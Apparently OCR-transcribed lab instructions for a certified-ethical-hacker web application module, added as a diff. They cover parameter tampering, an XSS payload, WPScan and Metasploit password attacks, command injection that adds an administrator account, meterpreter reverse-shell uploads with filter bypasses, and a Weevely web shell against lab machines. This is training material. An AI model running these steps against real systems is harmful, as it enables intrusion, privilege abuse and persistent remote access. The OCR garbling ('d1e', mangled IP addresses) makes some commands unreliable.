@@ -172,3 +172,225 @@ about other user accounts
 
 Exploit Parameter Tampering and XSS Vulnerabilities
 
+On the Windows 10 virtual machine, login withi the credentials Admin and Pa$$w0rd.
+3. Open any web browser (here, Mozilla Firefox), type http://www.moviescope.com/ into the address bar, and press Enter.
+4. The MovieScope website appears. In the Login form, type Username and Password as steve and password, and click Login.
+You are logged into the website. Click the View Profile tab from the menu bar.
+You will be redirected to the profile page, which displays the personal information of steve (here, you). You will observe that the value of ID in the
+personal information and address bar is 4.
+Now, try to change the parameter in the address bar to id=1 and press Enter.
+8. You will be redirected to the pro file of sam without having to perform any hacking techrúques to explore the database. Here, you can observe Sam's
+personal information under the View Profile tab,
+N ote This process of changing the ID value and getting the result is known as parameter tampering. Web XSS attacks exploit vulnerabilities on
+dynamically generated web pages. This enables malicious attackers to inject client-side scripts into the web pages viewed by other users.
+11. Now, click the Contacts tab. Here you will be performing an XSS attack
+The Contacts page appears; enter your name or any random name (here, steve) in the Name field; en ter the cross-site script <script>alert("Y ou are
+hacked")</script> in the Comment field and click the Submit Comment button.
+On this page, you are testmg for XSS vulnerability. Now, refresh the Contacts page.
+Note: If a notification appears saying To display this page, Firefox must send information .... , click the Resend button
+
+Perform Cross-site Request Forgery (CSRF) Attack
+
+Now, open any web browser (here, Mozilla Firefox) and type http://1 0.1 0.1 0.16:8080/CEH/wp-login.php? In the address bar, and press Enter.
+Note: Here, we are opening d1e above-mentioned website as the victim.
+7. A WordPress webpage appears. Type Usemame or Email Address and Password as admin and qwerty@123. Click the LogIn button
+Assume that you have installed and configured the Firewall plugin for this site and that you want to check the securíty configurations.
+9. hover your mouse cursor on Plugins in the left pane and click lnstalled Plugins
+In the Plugins page, observe that leenk.me is installed. Click Activate under the leenk.me plugin to actívate the plugin
+Refresh the page and observe that the leen k. me plugin option appears in the left pane; click it.
+12. Thee leenk.me General Settings page appears. Tick the Facebook checkbox in the Choose which social network modules you want to
+enable for this site option under the Administrator Options section and click the Save Settings button
+The leenk.me General Settings page appears, as shown in the screenshot
+Ensure that under the Administrator Options section, the Facebook checkbox is selected in the Choose which social network modules you
+want to enable for this site option and click the Facebook Settings hyperlink
+A Facebook Settings page appears; tmder Message Settings, enter the details below:
+• Default Message: This is CEH lab.
+• Default Link Name: CEH.com
+• Default Caption: CEH Labs
+15. Clear the Default Description text field. Leave the other settings to default and click the Save Settings button to save the settings
+Now, switch to the Parrot Security
+T11e Mozilla Firefox window appears. Type https://wpvulndb.com/users/sign_up into the address bar and press Enter.
+20. A webpage with a Register a new user form appears; enter your personal details in the given fields. In the Your Website field, enter the website as
+http://10.10.10.16:8080/CEH and click d1e REGISTER button
+On the next page, the WPScan Vulnerability Database appears along with a notification saying A message with a confirmation link has been sent to your email address ...
+22. Now, open a new tab in the Firefox browser and open the email account you gave while registering as a new user in Step 20.
+23. Once you are logged into your email account, open rl1e email from noreply@wpvulndb.com, and in the email, click the Confirm my account hyperlink
+A new webpage appears with a message saying Your email address has been successfully confirmed. Enter the same details in the Email Address and Password fields that you provided
+The Edit Profile page appears; scroll down to the API Token section and observe the API Token. Note down this API Token; we will use this tokenin the later steps.
+In the Terminal winqow, type wpscan --api-token <API Token from Step#26> --url http://10.10.1.16:8080/CEH --plugins-detection aggressive --enumerate vp and press Enter.
+Note: - -enumerate vp: specifies the enumeration of vulnerable plugins
+The result appears, displaying detailed information regarding the target website
+Scroll clown to the Plugin(s) ldentified section, and observe the installed vulnerable plugins (akismet and leenkme) on the target website.
+
+
+Enumerate and Hack a Web Application using WPScan and Metasploit
+
+In the Terminal window, type wpscan --api-token <API Token> --url http:/110.10.10.16:8080/CEH --enumerate u and press Enter.
+Note: --enumerate u: specifies the enumeration of usernames.
+Note: Here, we will use the API token that we obtained by registering with me https://wpvulndb.com/users/sign_up website.
+WPScan begins to enumerare me usernames stored in the website's
+database. The result appears, displaying detailed information from the target website.
+7. Scroll clown to the User(s) ldentified section and observe the information regarding d1e available user accounts.
+To obtain d1e passwords, you will use d1e auxiliary module called wordpress_login_enum (in msfconsole) to perform a dictionary attack
+using the password.txt fue (in the Wordlist folder) which you copied to the location /home/attacker/Desktop in the previous task.
+1O. To use the wordpress_login_enum auxiliary module, you need to first launch msfconsole. However, be fore this, you need to start the PostgreSQL service.
+11. In the terminal window, type service postgresql start and press Enter to start the PostgreSQL service.
+Type msfconsole and press Enter to launch the Metasploit framework.
+13. In msfconsole, type use auxiliary/scanner/http/wordpress_login_enum and press Enter
+To know all options available to configure in this Metasploit module, type show options, and press Enter.
+16. This provides a list of options that can be set for this module. As we must obtain the password for the target user account, we will set the below options:
+PASS_FILE: Sets the password.txt file, using which; you will perform the dictionary attack
+RHOST: Sets the target machine (here, the Windows Server 2016 IP address)
+RPORT: Sets the target machine port (here, the Windows Server 2016 port) 8080
+TARGETURI: Sets the base path to d1e WordPress website (here, http://[IP Address of Windows Server 2016]:8080/CEH]
+USERNAME: Sets the username that was obtained in Step 7. (here,admin)
+All the options have successfully been set. Type run and press Enter to execute the auxiliary module.
+The auxiliary module tests various passwords against the given username (admin) and the cracked password is displayed
+
+Exploit a Remote Command Execution Vulnerability to Compromise a Target Web Server
+
+windows10 Open any web browser (here, Mozilla Firefox), type http://10.10.10.16:8080/dvwa/login.php into the address bar, and press Enter.
+The Vulnerability: Command lnjection page appears; under the Ping a device section, type the IP address of the Windows Server 2016 virtual
+machine (here, 10.10.10.16) into the Enter an IP address field and click the Submit button to ping the machine
+The Vulnerability: Command lnjection page appears; type | hostname into the Enter an IP address field, and click Submit.
+19. DVWA returns the name of d1e Windows Server 2016 virtual machine, as shown in the screenshot.
+Type the command | whoami and click Submit.
+Type the command | tasklist and click Submit.
+Type | Taskkill /PID [Process ID value of the desired process] /F (here, PID is 2192) and click Submit . By issuíng this command, you are
+forcefully (IF) terminating d1e process.
+Now, to view the directory structure o f the Windows Server 2016 virtual machine, type | dir C:\ and click Submit to view the files and directories on the C:\ drive.
+To view user account information, type | net user, and click Submit
+Create an account named Test. To do so, type | net user Test /Add and click Submit .
+To view the new user account, type the command | net user and click Submit.
+39. You can observe the newly created account Test
+Now, view the new account's information. Type | net user Test and click Submit.
+Now, assign administrative privileges to the account. The reason for granting administrative privileges to this account is to use this (admin)
+accout to log into the Windows Server 2016 machine with administrator access using a remote desktop connection.
+43. To grant administrative privileges, type | net localgroup Administrators Test /Add and click Submit
+You have successfully granted admin privileges to the accotmt. Confirm the new setting by issuing the command | net user Test. Test is now an
+administrator account under the Local Group Memberships option
+Now, log into the Windows Server 2016 virtual machine using the Test
+accotmt through Remote Desktop Connection.
+46. Click the Type here to search field from the bottom of Desktop and type Remote. Click Remote Desktop Connection from the results.
+47. The Remote Desktop Connection window appears. In d1e Computer field, type the target system IP address (here, 10.10.10.16 [Windows Server2016]) and click Show Options
+The Remote Desktop Connection window appears with the General tab displayed; enter the User name as test and click Connect
+leave the Password field empty and click OK
+
+Exploit a File Upload Vulnerability at Different Security Levels
+Low
+A Parrot Terminal window appears; type msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address of Host Machine> LPORT=4444 -f raw and press Enter.
+N ote: Here, d1e IP address of me host machine is 10.10.10.13 (the  Parrot Security virtual machine).
+The raw payload is generated in the terminal window. Select the payload, right-click on it, and click copy from the context menu to copy the payload
+Now, in the terminal window, type cd /home/attacker/Desktop and press Enter to navigate to the Desktop folder.
+1 O. Type pluma upload.php and press Enter to launch the Pluma text editor
+press Ctri+V to paste the raw payload copied in Step 8, and then press Ctri+S to save the content
+Click the Firefox icon m from the top section of Desktop, type http://10.10.10.16:8080/dvwa/login.php. lnto the address bar and press Enter.
+13. The DVWA login page appears; enter the Username and Password as admin and password. Click the Login button
+Click the File Upload option from the left pane.
+17. The Vulnerability: File Upload page appears; click the Browse ••• button to upload a file
+When the File Upload window appears, navigate to the Desktop location, select the payload file upload.php, and click Open.
+Now, click the Upload button to upload the file to the database
+In the terminal Parrot, type msfconsole and press Enter to launch the Metasploit framework.
+27. In msfconsole, type use exploit/multi/handler and press Enter to set up the listener.
+Now, set the payload, LHOST, and LPORT. Todo so, use the below commands:
+Type set payload php/meterpreter/reverse _tcp and press Enter
+Type set LHOST 10.10.10.13 and press Enter
+Type set LPORT 4444 and press Enter
+Type run and press Enter to start the listener
+29. Observe that the listener is up and running at 10.10.10.13. Minimize the terminal window.
+Switch back to the Mozilla Firefox window where the DVWA website is
+open. Press Ctrl+T to open a new tab, type http://10.10.10.16:8080/dvwa/hackable/uploadslupload.php) in the address bar, and press Enter to execute the uploaded payload.
+Switch back to the Terminal window and observe that a Meterpreter session has successfully been established with the victim system, 
+In the meterpreter command line, type sysinfo and press Enter to view the system details of the victim machine
+Medium
+In the Terminal window, type msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address of Host Machine> LPORT=3333 -f raw and press Enter.
+Note: Here, the IP address of the host machine is 10.10.10.13 (Parrot Security virtual machine).
+39. The raw payload is generated in the tenninal window. Select the payload, right-click on it, and click copy from the context menu to copy the payload
+Now, in d1e terminal window, type cd /home/attacker/Desktop and press Enter to navigate to the Desktop folder.
+41. Type pluma medium.php.jpg and press Enter to launch the Pluma text editor  and copy the raw
+Click the File Upload option in the left pane.
+47. The Vulnerability: File Upload page appears; click the Browse ••• button to upload a file
+Active proxy and start burpsuite
+In the Proxy settings, by default, the lntercept tab opens-up. Observe that the interception is active by default, as the button says lntercept is on. Leave it runrung.
+Switch back to the browser window and click the Upload button under the Vulnerability: File Upload section to upload the payload file
+Switch back to the Burp Suite window. Observe that the request has been captured and displayed in the raw format under the Raw tab. In fi1e filename
+field, you will see the name of the file to be uploaded as medium.php.jpg.
+Change the filename to medium.php and click the Forward button to forward the request
+Now, turn the interception off byclicking on the lntercept is on button. The button now says lntercept is off,  Close the window.
+Switch back to the browser window. Observe a message saying that the file has been uploaded successfully, along with the upload location of the file. Note down this location.
+Remove the browser proxy set up in Step 54 by selecting the No proxy radio-button in the Connection Settings window and clicking OK. Close the tab
+Now, type cd and press Enter to jump to the root directory.
+72. In the Terminal window, type msfconsole and press Enter to launch the Metasploit framework.
+73. In msfconsole, type use exploit/multi/handler and press Enter to begin setting up the listener.
+74. You have to set up a listener so that you can establish a Meterpreter session with your victim. Follow the steps given below to set up a listener
+using the msf command line:•
+Type set payload php/meterpreter/reverse_tcp and press Enter
+Type set LHOST 10.10.10.13 and press Enter
+Type set LPORT 3333 and press Enter .
+Type run and press Enter to start the listener
+Switch to the Mozilla Firefox window where the DVWA website is open.
+Press Ctri+T to open a new tab, type http://10.10.10.16:8080/dvwa/hackable/uploadslmedium.php) into the address bar and press Enter to execute the uploaded payload.
+Switch back to the Terminal window and observe that a Meterpreter session has successfully been established with the victim system.
+77. In the meterpreter command line, type sysinfo and press Enter to view the system details of the victim machine
+High
+In the Terminal window, type msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address of Host Machine> LPORT=2222 -f raw and press Enter.
+84. The raw payload is generated in the terminal window. Select the payload, right-click on it, and click c.opy from the context menu to copy the payload
+Now, in the terminal window, type cd /home/attacker/Desktop and press Enter to navigate to the Desktop folder.
+Type pluma high.jpeg and press Enter to launch the Pluma text editor.
+The Pluma text editor window appears; press Ctrl+V to the paste the raw payload code copied in Step 84.
+Edit the payload file by adding GIF98 to d1e first line and press Ctrl+S to save
+Click the Firefox icon from the top section of Desktop, type http://10.10.10.16:8080/dvwa/login.php into the address bar and press
+Enter. The DVWA login page appears. Log in with the credentials admin and password, and click the Login button
+The Vulnerability: File Upload page appears. Click the Browse ••• button to upload a file
+The File Upload window appears. Navigate to the Desktop location, select the payload file high.jpeg, and click Open
+Now, click the Command lnjection option in the left pane. The Vulnerability: Command lnjection window appears; in the Enter an IP address field, type 
+|copy C:\wamp64\www\DVWA\hackable\uploads\high.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php and click the Submit button.
+In the Terminal window, type msfconsole and press Enter to launch the Metasploit framework.
+104. In msfconsole, type use exploit/multi/handler and press Enter to set up the listener.
+105. To establish a Meterpreter session with your victim, you have to set up a listener. Todo so, follow the steps given below to set up a listener using the
+msf command line:
+Type set payload php/meterpreter/reverse_tcp and press Enter
+Type set LHOST 10.10.10.13 and press Enter
+Type set LPORT 2222 and press Enter
+Type run and press Enter to start the listener
+Switch to the Mozilla Firefox window where the DVWA website is open.
+Press Ctrl+T to open a new tab, type http://10.10.10.16:8080/dvwa/hackable/uploads/shell.php) into the address bar and press Enter to execute the uploaded payload
+Switch back to the Terminal window and o bserve that a Meterpreter session has successfully been established with the victim system.
+108. In the meterpreter command line, type sysinfo and press Enter to view the system details of the victim machine.
+
+Weevely
+
+In the terminal window in Parrot; type weevely generate <Password> <FilePath> (here, the password is toor, and the file path is /home/attacker/Desktop/shell.php) 
+and press Enter to generate a shell ftle.
+Note: Weevely encodes the payload with a key phrase so that no one else can use it to access the target system.
+Now, click the Firefox icon from the top section of Desktop, type http://1O.1O.1O.16:8080/dvwa/login.php into the address bar, and press  Enter
+Click the File Upload option from d1e left pane.
+12. The Vulnerability: File Upload page appears. Click the Browse ••• button to upload a file
+The File Upload window appears; navigate to the Desktop location, select the payload file shell.php, and click Open
+You will see a message that the file has successfully been uploaded, with the location of the file. Note the location o f the file and minimize the browser window.
+Switch back to d1e Terminal window, type weevely http://10.10.10.16:8080/dvwa/hackable/uploads/shell.php <Password>
+(The password that you have provided in Step#S), and press Enter. This command establishes a connection with the payload and interacts with the target.
+Now, type whoami and press Enter to view the system details of the victim machine
+Now, type ipconfig and press Enter to view the IP configuration of the victim machine
+
+NStalkerWebSecuñtyScanner
+
+Navigate to the location Z:\CEHv11 Module 14 Hacking Web Applications\Web Application Secuñty Testing Tools\N-Stalker Web Application Security Scanner and double-click NStalkerWebSecuñtyScanner-
+FreeX-b34.exe.
+The N-Stalker Web Application Security Scanner main window appears; click the Update button under the N-Stalker Update Status section.
+now press start
+The N-Stalker Sean Wizard appears. Under the Enter Web Application URL field, enter http://www.moviescope.com and under Choose Sean Policy
+field, select OWASP Policy from the drop-down list; click Next.
+The Optimize Settings wizard appears; leave the default settings and click Next.
+If a Settings Not Optimized pop-up appears, click Yes.
+15. The Review Summary wizard appears. Verify the Scan Settings and click Start Session
+If an N-Stalker Free Edition pop-up appears; click OK to continue
+17. After completing the configuration of N -Stalker, click Start Scan from the menu bar to begin scanning the MovieScope website
+N-Stalker begins to sean the website. It goes through various steps such as Step 1 Spider, Step 2 lnfo Gather, Step 3 Run Modules, and Step 4 Sig Scanner,
+Ensure that the Save sean results radio button is selected under the Session Management Options section; and under the Next Steps section, select the
+Keep scan session for further analysis radio button and click Next
+N-Stalker displays a summary of the vulnerabilities found. After examining the summary, click the Done button
+In the left pane, expand all the nodes and sub-nodes of the URL http://www.moviescope.com/ under the Website Tree section. This displays the website's pages.
+Now, click to expand the URL http://www.moviescope.com/ under Vulnerabilities in the Scanner Events section to view all the site's vulnerabilities.
+Expand any of the discovered vulnerability nodes and any of the sub-nodes associated wid1 it. Here, we are expanding the first vulnerability, Application
+might be vulnerable to clickjacking attacks
